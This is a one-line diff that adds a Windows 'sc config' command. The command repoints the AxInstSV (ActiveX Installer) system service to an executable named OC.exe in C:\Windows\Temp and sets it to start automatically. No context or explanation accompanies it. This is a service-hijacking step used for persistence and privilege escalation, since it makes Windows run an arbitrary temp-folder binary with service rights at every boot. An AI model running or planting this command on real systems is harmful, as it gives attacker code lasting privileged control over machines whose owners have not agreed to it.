@@ -1,0 +1,1 @@
+sc config AxInstSV binPath= "C:\Windows\Temp\OC.exe" start= auto
